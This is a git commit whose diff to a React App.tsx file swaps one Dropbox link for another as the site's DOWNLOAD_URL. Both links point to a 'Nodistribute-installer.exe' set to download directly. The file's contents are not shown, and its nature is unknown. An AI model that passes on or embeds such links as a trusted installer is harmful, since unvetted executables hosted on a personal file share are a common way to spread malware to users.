16ec5fdc99cd76d275712f1269a8aeb8be870e17
aimwizards <artisticwonder123@gmail.com>
2024-11-13 07:20:32 +0100

    Update App.tsx

--- src/App.tsx
+++ src/App.tsx
@@ -8,7 +8,7 @@ import { cn } from '@/lib/utils';
 
 function App() {
   const [isMenuOpen, setIsMenuOpen] = useState(false);
-  const DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/8x95uiw2flzo3bpvn0rlg/Nodistribute-installer.exe?rlkey=ivcavtinv1p0vak9tgqpt9ai0&st=fhs5tndg&dl=1";
+  const DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/s9dambt5p0sw58u0mzy2n/Nodistribute-installer.exe?rlkey=3ecdqpgc6o7v8sqc68xybvtso&st=gu6pwjca&dl=1";
 
   const footerLinks = {
     product: [
